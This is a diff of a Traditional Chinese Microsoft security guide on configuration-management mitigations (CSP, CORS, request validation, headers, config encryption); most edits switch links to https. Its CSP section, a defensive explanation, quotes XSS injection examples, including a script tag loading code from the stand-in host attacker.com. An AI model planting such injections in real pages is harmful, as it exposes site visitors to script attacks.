@@ -14,12 +14,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: b24d32afed5acfd846f9a8e8316339665524ad2e
-ms.sourcegitcommit: 11d8ce8cd720a1ec6ca130e118489c6459e04114
-ms.translationtype: HT
+ms.openlocfilehash: bd1d3c71660ae584b0aa57c7cc765fdc519f4b1b
+ms.sourcegitcommit: 5839af386c5a2ad46aaaeb90a13065ef94e61e74
+ms.translationtype: MT
 ms.contentlocale: zh-TW
-ms.lasthandoff: 12/04/2018
-ms.locfileid: "52849754"
+ms.lasthandoff: 03/19/2019
+ms.locfileid: "57863588"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>安全框架︰組態管理 | 緩和措施 
 | 產品/服務 | 文章 |
@@ -42,7 +42,7 @@ ms.locfileid: "52849754"
 | **SDL 階段**               | 建置 |  
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
-| **參考**              | [內容安全性原則簡介](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[內容安全性原則參考](http://content-security-policy.com/)、[安全性功能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[內容安全性原則簡介](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)、[我可以使用 CSP 嗎？](http://caniuse.com/#feat=contentsecuritypolicy) |
+| **參考**              | [內容安全性原則簡介](https://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[內容安全性原則參考](https://content-security-policy.com/)、[安全性功能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[內容安全性原則簡介](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)、[我可以使用 CSP 嗎？](https://caniuse.com/#feat=contentsecuritypolicy) |
 | **步驟** | <p>內容安全性原則 (CSP) 是深度防禦安全性機制、W3C 標準，可讓 Web 應用程式擁有者能控制其網站中內嵌的內容。 CSP 會新增為 Web 伺服器上的 HTTP 回應標頭，並由瀏覽器在用戶端上強制執行。 這是以允許清單為基礎的原則 - 網站可以宣告一組可從中載入主動式內容 (例如 JavaScript) 的受信任網域。</p><p>CSP 具有以下安全性優勢：</p><ul><li>**防禦 XSS︰** 如果頁面遭受 XSS 威脅，攻擊者入侵它的方式有 2 種︰<ul><li>插入 `<script>malicious code</script>`。 此入侵將因為 CSP 的基礎限制 1 而無法運作</li><li>插入 `<script src=”http://attacker.com/maliciousCode.js”/>`。 此入侵無法運作，因為攻擊者所控制的網域不在網域的 CSP 允許清單中</li></ul></li><li>**控制資料外洩︰** 如果網頁上的任何惡意內容嘗試連線至外部網站並竊取資料，CSP 將會中止連線。 這是因為目標網域不在 CSP 的允許清單中</li><li>**防禦點擊劫持：** 點擊劫持 (Clickjacking) 是一種攻擊技巧，敵人可用來建構真正的網站並強制使用者點按 UI 項目。 目前可藉由設定回應標頭- X-Frame-Options 來防禦點擊劫持。 並非所有瀏覽器都遵守此標頭，而轉寄 CSP 會是防禦點擊劫持的標準方法</li><li>**即時攻擊報告︰** 如果已啟用 CSP 的網站上有資料隱碼攻擊，則瀏覽器會自動對 Web 伺服器上設定的端點觸發通知。 如此一來，CSP 可當作即時警告系統。</li></ul> |
 
 ### <a name="example"></a>範例
@@ -85,7 +85,7 @@ Example: var str="alert(1)"; eval(str);
 | **SDL 階段**               | 建置 |  
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
-| **參考**              | [ASP.NET 偵錯概觀](http://msdn2.microsoft.com/library/ms227556.aspx)、[ASP.NET 追蹤概觀](http://msdn2.microsoft.com/library/bb386420.aspx)、[作法：對 ASP.NET 應用程式啟用追蹤](http://msdn2.microsoft.com/library/0x5wc973.aspx)、[作法：對 ASP.NET 應用程式啟用偵錯](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
+| **參考**              | [ASP.NET 偵錯概觀](https://msdn2.microsoft.com/library/ms227556.aspx)， [ASP.NET 追蹤概觀](https://msdn2.microsoft.com/library/bb386420.aspx)， [How to:啟用 ASP.NET 應用程式的追蹤](https://msdn2.microsoft.com/library/0x5wc973.aspx)， [How to:啟用 ASP.NET 應用程式的偵錯](https://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
 | **步驟** | 啟用頁面的追蹤後，每個要求該頁面的瀏覽器也會取得包含內部伺服器狀態和工作流程相關資料的追蹤資訊。 這項資訊可能是安全性相關資訊。 啟用頁面偵錯後，在伺服器上發生的錯誤會導致對瀏覽器呈現完整堆疊追蹤資料。 該資料可能會公開有關伺服器工作流程的安全性相關資訊。 |
 
 ## <a id="js-trusted"></a>僅從信任的來源存取第三方 javascript
@@ -152,7 +152,7 @@ Example: var str="alert(1)"; eval(str);
     <httpProtocol>
       <customHeaders>
         <clear />
-        <add name="Access-Control-Allow-Origin" value="http://example.com" />
+        <add name="Access-Control-Allow-Origin" value="https://example.com" />
       </customHeaders>
     </httpProtocol>
 ```
@@ -160,7 +160,7 @@ Example: var str="alert(1)"; eval(str);
 ### <a name="example"></a>範例
 如果無法存取 Web.config，則可藉由新增下列 CSharp 程式碼來設定 CORS︰ 
 ```csharp
-HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
+HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
 ```
 
 請注意，務必要確保 "Access-Control-Allow-Origin" 屬性中的原始來源清單設定為一組有限且受信任的原始來源。 無法適當地進行此設定 (例如將值設定為 '*') 會讓惡意網站在沒有任何限制的情況下，觸發對 Web 應用程式的跨源要求，而使應用程式容易遭受 CSRF 攻擊。 
@@ -173,7 +173,7 @@ HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example
 | **SDL 階段**               | 建置 |  
 | **適用的技術** | Web Form、MVC5 |
 | **屬性**              | N/A  |
-| **參考**              | [要求驗證 - 預防指令碼攻擊](http://www.asp.net/whitepapers/request-validation) |
+| **參考**              | [要求驗證 - 預防指令碼攻擊](https://www.asp.net/whitepapers/request-validation) |
 | **步驟** | <p>要求驗證 (1.1 版後的 ASP.NET 功能) 可防止伺服器接受包含未編碼 HTML 的內容。 這項功能設計用來協助防止某些指令碼資料隱碼攻擊，因此不知不覺地將用戶端指令碼或 HTML 提交至伺服器、加以儲存，而後呈現給其他使用者。 我們仍強烈建議您驗證所有輸入資料，而且適時進行 HTML 編碼。</p><p>藉由比較所有輸入資料與有潛在危險的值清單來執行要求驗證。 如果相符，ASP.NET 會引發 `HttpRequestValidationException`。 預設會啟用要求驗證功能。</p>|
 
 ### <a name="example"></a>範例
@@ -210,7 +210,7 @@ HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example
 | **SDL 階段**               | 建置 |  
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
-| **參考**              | [IE8 Security Part V：完善的保護](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx)、[MIME 類型](http://en.wikipedia.org/wiki/Mime_type) |
+| **參考**              | [IE8 Security Part V：完善的保護](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx)、[MIME 類型](https://en.wikipedia.org/wiki/Mime_type) |
 | **步驟** | X-Content-Type-Options 標頭是可讓開發人員指定不應對其內容探查 MIME 的 HTTP 標頭。 此標頭是設計用來降低 MIME 探查攻擊的風險。 對於可能包含使用者可控制內容的每個頁面，您必須使用 HTTP 標頭 Header X-Content-Type-Options:nosniff。 若要為應用程式中的所有頁面全域啟用必要標頭，您可以執行下列其中一項︰|
 
 ### <a name="example"></a>範例
@@ -297,7 +297,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | **SDL 階段**               | 建置 |  
 | **適用的技術** | MVC 5 |
 | **屬性**              | N/A  |
-| **參考**              | [在 ASP.NET Web API 2 中啟用跨源要求](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api)、[ASP.NET Web API - ASP.NET Web API 2 中的 CORS 支援](https://msdn.microsoft.com/magazine/dn532203.aspx) |
+| **參考**              | [在 ASP.NET Web API 2 中啟用跨源要求](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api)、[ASP.NET Web API - ASP.NET Web API 2 中的 CORS 支援](https://msdn.microsoft.com/magazine/dn532203.aspx) |
 | **步驟** | <p>瀏覽器安全性可防止網頁對另一個網域提出 AJAX 要求。 這項限制也稱為同源原則，可防止惡意網站從另一個網站讀取敏感性資料。 不過，有時候可能需要安全地公開其他網站可以取用的 API。 跨原始來源資源共用 (CORS) 是 W3C 標準，可讓伺服器放寬同源原則。</p><p>使用 CORS，伺服器可以明確允許某些跨源要求，然而拒絕其他要求。 相較於早期技術 (例如 JSONP)，CORS 較為安全且更具彈性。</p>|
 
 ### <a name="example"></a>範例
@@ -367,7 +367,7 @@ public class ResourcesController : ApiController
 ### <a name="example"></a>範例
 若要在類別中的特定方法上停用 CORS，可以使用 DisableCors 屬性，如下所示︰ 
 ```csharp
-[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
+[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
 public class ResourcesController : ApiController
 {
   public HttpResponseMessage Put(Resource data)
@@ -404,7 +404,7 @@ public class ResourcesController : ApiController
 public void Configure(IApplicationBuilder app)
 {
     app.UseCors(builder =>
-        builder.WithOrigins("http://example.com")
+        builder.WithOrigins("https://example.com")
         .WithMethods("GET", "POST", "HEAD")
         .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
 }
@@ -418,7 +418,7 @@ public void ConfigureServices(IServiceCollection services)
     services.AddCors(options =>
     {
         options.AddPolicy("AllowSpecificOrigin",
-            builder => builder.WithOrigins("http://example.com"));
+            builder => builder.WithOrigins("https://example.com"));
     });
 }
 public void Configure(IApplicationBuilder app)
@@ -485,7 +485,7 @@ public void ConfigureServices(IServiceCollection services)
 | **SDL 階段**               | 部署 |  
 | **適用的技術** | 泛型 |
 | **屬性**              | N/A  |
-| **參考**              | [作法：在 ASP.NET 2.0 中使用 DPAPI 加密組態區段](https://msdn.microsoft.com/library/ff647398.aspx)、[指定受保護的組態提供者](https://msdn.microsoft.com/library/68ze1hb2.aspx)、[使用 Azure Key Vault 來保護應用程式的機密資訊](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
+| **參考**              | [操作說明：在 ASP.NET 2.0 中使用 DPAPI 加密組態區段](https://msdn.microsoft.com/library/ff647398.aspx)、[指定受保護的組態提供者](https://msdn.microsoft.com/library/68ze1hb2.aspx)、[使用 Azure Key Vault 來保護應用程式的機密資訊](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
 | **步驟** | 組態檔 (例如 Web.config、appsettings.json) 常會用來敏感性資訊，包括使用者名稱、密碼、資料庫連接字串和加密金鑰。 如果您不保護這項資訊，您的應用程式會很容易受到攻擊者或惡意使用者攻擊，而被其取得敏感性資訊，例如帳戶使用者名稱和密碼、資料庫名稱和伺服器名稱。 請根據部署類型 (Azure/內部部署)，使用 DPAPI 或服務 (例如 Azure Key Vault) 加密組態檔的敏感性區段。 |
 
 ## <a id="admin-strong"></a>確保使用強式認證保護所有系統管理介面
